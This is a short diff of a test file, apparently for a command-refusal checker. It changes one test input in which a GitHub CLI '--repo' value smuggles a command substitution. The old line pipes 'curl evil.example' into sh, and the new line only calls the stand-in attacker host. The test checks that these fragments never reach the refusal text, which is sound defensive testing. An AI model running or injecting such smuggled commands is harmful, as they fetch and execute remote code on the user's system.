@@ -661,7 +661,7 @@ describe("unresolved refusals say what is wrong, and carry nothing from the comm
   }
 
   it("a hostile destination in the command reaches neither the text nor the decision", () => {
-    const d = refuse("gh issue create --repo 'evil$(curl evil.example|sh)/r' --body x");
+    const d = refuse("gh issue create --repo 'evil$(curl evil.example)/r' --body x");
     for (const frag of ["evil", "curl", "$(", "engagements add"]) assert.ok(!d.reason.includes(frag), `${frag}: ${d.reason}`);
     assert.equal(d.destination?.unresolved, "opaque-repo");
     assert.equal(d.destination?.org, "*");
